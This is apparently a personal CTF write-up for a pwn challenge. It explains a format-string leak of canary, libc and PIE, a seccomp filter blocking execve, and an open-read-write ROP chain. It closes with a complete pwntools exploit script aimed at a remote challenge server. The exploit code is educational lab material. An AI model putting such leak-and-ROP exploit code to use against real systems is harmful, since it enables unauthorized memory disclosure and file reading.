# 1.0 Challenge
1. leak canary libc pie
2. seccomp disable execve 
3. HOW TO build orw payload？

# 2.0 Analysis

source code 
```
  while ( 1 )
  {
    write(1, "message: ", 9u);
    gets(format);
    printf(format);
    if ( format[0] == 'x' )
      break;
    putchar(10);
  }
  return 0;
}
```
经典的 canary leak 
可是这题 特别的是 orw
因为他开了
```
──(kali㉿kali)-[~/Desktop/CTF/wangding/orw]
└─$ seccomp-tools dump ./task_patched
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL

```
caooooo

有一个很好笑的问题 我send 完payload的时候 一直以为做错了
原来是 要send filename
不知道zmk flag.txt 不可以 只有 flag 可以 ???? 

# 3.0 Solution

## 3.1 how to leak libc 
经典 用 [[PWN -- super_jumpio_kart -- canary ROP]]
```
[15] Possible Canary: 0xc29d7f8fc494df00
[16] Possible LIBC  : 0x7fffffffdcb0
[17] Possible PIE   : 0x555555400c63
```
算offset 罢了

## 3.2 seccomp disable execve 
其实怎样知道leh
有方法的 看ida 明显 sandbox function 那边
啊不然 就 seccomp-tools dump ./task_patched 跑一下

## 3.3 HOW TO build orw payload？


这个算是我第一次动到 ORW
它阻止了两个 syscall：
- `execve` (59)
- `execveat` (322)

✅ 所以**不能用 one_gadget 或 system('/bin/sh') 来打 shell**  
✅ 但可以用 `open`, `read`, `write` 来 ORW 读取 flag 文件。

现在的target !!!!
手动调用 `open("flag", 0)` → `read(fd, buf, 128)` → `write(1, buf, 128)` 来读取 flag

```python
buff = exe.bss(0x200) #<- 随便放一个空的地方
rop.call('gets', [buff])                # 让用户输入 flag 文件名（比如 "flag"）
rop.call('open', [buff, 0])             # 打开该文件
rop.call('read', [3, buff, 128])        # 读取前 128 字节到 buff（fd 通常是 3）
rop.call('write', [1, buff, 128])       # 把内容写回标准输出
```

怎样触发 这个 orw 不能随便填 a b c d
if ( format[0] == 'x' ) 他有讲 要 x 
然后 offset 看下面

canary offset 算法
```bash
pwndbg> stack 30
00:0000│ rax rsp 0x7fffffffdb70 ◂— 0x61616161 /* 'aaaa' */
01:0008│-048     0x7fffffffdb78 ◂— 0
... ↓            5 skipped
07:0038│-018     0x7fffffffdba8 ◂— 0x555500000000
08:0040│-010     0x7fffffffdbb0 —▸ 0x7fffffffdcb0 ◂— 1
09:0048│-008     0x7fffffffdbb8 ◂— 0x8d818f0b7b878800
0a:0050│ rbp     0x7fffffffdbc0 —▸ 0x7fffffffdbd0 —▸ 0x555555400c70 (__libc_csu_init) ◂— push r15
0b:0058│+008     0x7fffffffdbc8 —▸ 0x555555400c63 (main+24) ◂— mov eax, 0
0c:0060│+010     0x7fffffffdbd0 —▸ 0x555555400c70 (__libc_csu_init) ◂— push r15
0d:0068│+018     0x7fffffffdbd8 —▸ 0x7ffff7821c87 (__libc_start_main+231) ◂— mov edi, eax
0e:0070│+020     0x7fffffffdbe0 ◂— 0x2000000000
0f:0078│+028     0x7fffffffdbe8 —▸ 0x7fffffffdcb8 —▸ 0x7fffffffe06e ◂— '/home/kali/Desktop/CTF/wangding/echo/task_patched'

```
0x7fffffffdbb8 - 0x7fffffffdb70 = 0x48

8 的话是因为他直接 leave ret 了 不确定的话 看 有sample 不是8 的 [[PWN -- super_jumpio_kart -- canary ROP]]

# 4.0 FLAG 
after ctf
# 5.0 FINAL SCRIPT 
```python
# -*- coding: utf-8 -*-
from pwn import*
# context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./task_patched"

libc  = ELF('./libc.so.6', checksec=False)
ld = ELF("./ld-2.27.so")
exe = context.binary = ELF(pc)



scripts = """
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def piebase(): log.info("pie  base = %#x" % exe.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s, drop=True)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)

# leak libc
sla("message: ","%15$p.%16$p.%17$p")
# base 0x7ffff7800000
# leak 0x7ffff7beba83
# offset 0x83FBA40
# offset = 0x7ffff7beba83 - 0x7ffff7800000
# print("offset",hex(offset))
leak = rl().decode().strip()
log.success(f"leak = {leak}")
parts = leak.split(".")

leak_stack = int(parts[1], 16)
canary = int(parts[0], 16)
pie = int(parts[2], 16)

log.success(f"leak_stack = {hex(leak_stack)}")
log.success(f"canary     = {hex(canary)}")
log.success(f"pie     = {hex(pie)}")

# 0x87fdcb0
# offset = leak_stack - 0x7ffff7800000
# print(f"offset to base: {hex(offset)}")

libc.address=leak_stack-0x87fdcb0
logbase()
exe.address=pie-0xc63
piebase()

# base 0x555555400000


# dbg()

# our rop
rop = ROP(libc)
buff = exe.bss(0x200)
rop.call('gets', [buff])
rop.call('open', [buff,0])
rop.call('read', [3, buff,128])
rop.call('write', [1, buff,128])

offset = 0x48
payload = b'x' * offset
payload += p64(canary)
payload += b'b' * 8
payload += rop.chain()

sla("message: ",payload)
# sl('/flag.txt\x00')

ti()

```


# 6.0 REFERENCE
https://github.com/nobodyisnobody/write-ups/blob/1027ab1f093d316d1b8170849d82abd0caae32f8/TyphoonCon.CTF.2023/pwn/Echo.Time/working.exploit.py